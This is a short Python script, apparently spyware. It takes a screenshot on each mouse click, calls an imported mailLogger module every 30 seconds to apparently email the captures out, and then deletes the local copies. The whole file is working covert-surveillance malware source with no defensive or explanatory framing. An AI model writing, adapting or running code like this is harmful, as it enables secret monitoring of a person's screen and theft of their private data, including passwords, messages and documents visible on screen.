import os
import pyscreenshot 
from time import sleep
from pynput.mouse import Listener
import threading
from mailLogger import SendMail
# Path  
global path
path = './screenshot/'

global intrevel
intrevel=30

global imageNumber
imageNumber=0

def takeScreenshoot(path):
    global imageNumber
    image = pyscreenshot.grab()
    file_path=path+"Screenshoot_"+str(imageNumber)+".png"
    # To save the screenshot 
    image.save(file_path)
    imageNumber+=1


def cleanDirectory(path):
    
    for file in os.listdir(path):
        os.remove(path+file)
        #print(file)
    print('File Cleaned...')


if not os.path.isdir(path):
    os.mkdir(path)



def on_click(x, y, button, pressed):
    global path
    if pressed:
        takeScreenshoot(path)
        print('ScreenShoot Taken')



def report():
    global path,intrevel
    SendMail()
    print('Mail Sent')
    cleanDirectory(path)
    timer = threading.Timer(intrevel, report)
    timer.start()


with Listener(on_click=on_click) as listener:
    report()
    listener.join()

#main(path)



